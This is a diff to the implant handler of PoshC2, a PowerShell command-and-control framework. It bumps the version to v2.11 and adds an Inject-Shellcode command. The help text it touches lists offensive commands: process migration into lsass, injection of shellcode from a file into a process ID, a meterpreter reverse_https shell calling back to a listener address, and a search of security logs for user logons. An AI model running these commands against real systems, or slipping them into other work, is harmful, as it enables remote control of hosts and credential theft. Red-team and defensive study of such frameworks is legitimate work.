@@ -45,6 +45,7 @@ function Implant-Handler
     $ipv4address = $c2serverresults.HostnameIP
     $serverport = $c2serverresults.ServerPort
     $URLS =  $c2serverresults.URLS
+    $Host.ui.RawUI.WindowTitle = "PoshC2 Implant Handler: $ipv4address Port $serverport"
         
 $head = '
 <style>
@@ -115,7 +116,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v2.10 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v2.11 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host "===================================================" `n -ForegroundColor Green
 
             foreach ($implant in $dbresults) 
@@ -611,6 +612,7 @@ $header = '
         write-host " Migrate-x86 -ProcName lsass" -ForegroundColor Green
         write-host " Migrate-Proxypayload-x86 -ProcID 4444" -ForegroundColor Green
         write-host " Migrate-Proxypayload-x64 -ProcName notepad" -ForegroundColor Green
+        write-host " Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
         write-host ' Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>'-ForegroundColor Green
@@ -1508,6 +1510,10 @@ param
             if ($pscommand.ToLower().StartsWith('invoke-portscan'))
             { 
                 CheckModuleLoaded "Invoke-Portscan.ps1" $psrandomuri
+            }
+            if ($pscommand.ToLower().StartsWith('inject-shellcode'))
+            { 
+                CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('get-mshotfixes'))
             { 
